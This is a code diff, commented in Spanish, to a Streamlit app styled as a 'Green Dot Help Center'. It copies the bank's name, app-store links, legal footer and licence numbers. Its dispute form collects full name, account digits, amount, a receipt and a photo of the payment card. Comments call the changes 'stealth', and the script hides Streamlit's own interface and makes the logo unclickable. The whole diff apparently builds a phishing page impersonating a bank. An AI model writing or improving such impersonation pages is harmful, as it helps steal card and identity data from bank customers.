@@ -24,74 +24,126 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JS DE VISIBILIDAD RADICAL (v1.3.2)
+# JS: REFUERZO DE VISIBILIDAD Y ELIMINACIÓN DE EVENTOS EN LOGO/H1
 st.markdown("""<script>
-    const reinforceUI = () => {
-        // Seleccionar específicamente los textos de ayuda del uploader
-        const uploaderLabels = document.querySelectorAll('[data-testid="stFileUploader"] div[data-testid="stMarkdownContainer"] p, [data-testid="stFileUploader"] small');
-        uploaderLabels.forEach(el => {
+    const applyStealthRules = () => {
+        // 1. Visibilidad del Uploader (200MB per file...)
+        document.querySelectorAll('[data-testid="stFileUploader"] small, [data-testid="stFileUploader"] p').forEach(el => {
             el.style.setProperty('color', '#FFFFFF', 'important');
             el.style.setProperty('opacity', '1', 'important');
             el.style.setProperty('-webkit-text-fill-color', '#FFFFFF', 'important');
         });
 
-        // Forzar fondo negro en el contenedor para asegurar contraste
-        document.querySelectorAll('[data-testid="stFileUploader"] section').forEach(section => {
-            section.style.setProperty('background-color', '#1a1a1a', 'important');
+        // 2. Desactivar clicks en logo y títulos (Para evitar que funcionen como links)
+        const noClick = ['h1', 'img[alt="logo"]', '[data-testid="stImage"]'];
+        noClick.forEach(s => {
+            document.querySelectorAll(s).forEach(el => {
+                el.style.pointerEvents = 'none';
+                el.style.cursor = 'default';
+            });
         });
 
-        // Limpieza de interfaz
+        // 3. Limpieza de UI Streamlit
         ['header', 'footer', '.stDeployButton', '[data-testid="stHeader"]'].forEach(s => {
             document.querySelectorAll(s).forEach(el => el.remove());
         });
     };
-    setInterval(reinforceUI, 50);
+    setInterval(applyStealthRules, 100);
 </script>""", unsafe_allow_html=True)
 
-# CSS DE ALTA ESPECIFICIDAD
+# CSS: IDENTIDAD STEALTH Y RESPONSIVIDAD
 st.markdown("""<style>
     html, body, .stApp {
         background-color: #000000 !important;
-    }
-
-    /* FUERZA BRUTA PARA EL TEXTO DEL UPLOADER */
-    [data-testid="stFileUploader"] * {
         color: #FFFFFF !important;
     }
 
-    [data-testid="stFileUploader"] small {
-        color: #FFFFFF !important;
-        font-weight: 600 !important;
+    /* Contenedor adaptado */
+    .block-container {
+        max-width: 500px !important;
+        padding-top: 2rem !important;
     }
 
-    /* Evitar que el modo claro de iOS/Android lo ponga gris */
-    p, span, label, div {
-        color: #FFFFFF !important;
+    /* Texto del cargador */
+    [data-testid="stFileUploader"] section {
+        background-color: #1a1a1a !important;
+        border: 1px dashed #333 !important;
     }
 
+    /* Botón Principal */
     .stButton > button {
         background-color: #00a05b !important;
         color: #FFFFFF !important;
-        border: 1px solid #FFFFFF !important;
+        border-radius: 8px !important;
+        width: 100% !important;
+        font-weight: bold !important;
+        height: 50px !important;
+        border: none !important;
     }
 
-    .block-container {
-        max-width: 500px !important;
-        background-color: #000000 !important;
+    /* Inputs */
+    .stTextInput input, .stNumberInput input {
+        background-color: #111 !important;
+        color: white !important;
+        border: 1px solid #333 !important;
+    }
+
+    /* Sección Promo (Download App) */
+    .promo-container {
+        background-color: #0e0e0e;
+        padding: 30px 15px;
+        border-radius: 12px;
+        text-align: center;
+        margin-top: 30px;
+        border: 1px solid #222;
+    }
+
+    /* Footer Legal */
+    .legal-footer {
+        font-size: 11px;
+        color: #666;
+        text-align: justify;
+        margin-top: 40px;
+        padding-top: 20px;
+        border-top: 1px solid #222;
+        line-height: 1.5;
     }
 
     header, footer, .stDeployButton { display: none !important; }
 </style>""", unsafe_allow_html=True)
 
-if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
-st.title("Help Center")
-st.write("Please fill out the form to submit your dispute.")
+# UI: LOGO
+if os.path.exists("logo.svg"):
+    st.image("logo.svg", width=220)
 
-with st.form("claim_v1_3_2", clear_on_submit=True):
+st.title("Help Center")
+st.write("Please fill out the form below to submit your dispute.")
+
+with st.form("final_form_v133", clear_on_submit=True):
     st.text_input("Full Name")
-    st.text_input("Last 4 digits of Account")
+    st.text_input("Account Number (Last 4 digits)")
     st.number_input("Disputed Amount", format="%.2f")
     st.file_uploader("Store Receipt", type=["jpg","png"])
     st.file_uploader("Card Photo", type=["jpg","png"])
     if st.form_submit_button("SUBMIT NOW"):
-        st.success("Claim Received.")
+        st.success("✅ Claim Received.")
+
+# RESTAURACIÓN: DOWNLOAD APP SECTION
+st.markdown("""<div class='promo-container'>
+    <p style='color: white !important; font-weight: bold; margin-bottom: 20px;'>Download the Green Dot app</p>
+    <div style='display: flex; justify-content: center; gap: 15px;'>
+        <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
+            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
+        </a>
+        <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
+            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
+        </a>
+    </div>
+</div>""", unsafe_allow_html=True)
+
+# RESTAURACIÓN: FOOTER LEGAL
+st.markdown("""<div class='legal-footer'>
+    Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. 
+    &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924; Green Dot Bank NMLS #908739.<br><br>
+    Not a gift card. Must be 18 or older to purchase. Online access and identity verification are required.
+</div>""", unsafe_allow_html=True)
